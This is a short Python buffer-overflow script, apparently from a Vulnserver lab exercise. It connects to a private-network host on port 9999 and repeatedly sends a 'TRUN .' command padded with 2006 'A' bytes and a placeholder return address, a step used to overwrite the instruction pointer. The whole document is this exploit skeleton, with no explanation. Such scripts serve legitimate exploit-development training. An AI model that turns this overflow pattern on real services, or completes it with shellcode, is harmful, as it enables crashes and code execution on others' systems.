#!/usr/bin/env python3 
import socket

ip = "192.168.206.128"
port = 9999

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
d = s.recv(64)
print(d)
head = b"TRUN ."
padding = b"A"*2006

ret_addr = b"ZZZZ"

buffer = head + padding + ret_addr

while True:
    s.send(buffer)
    data = s.recv(64)
    print(data)
    
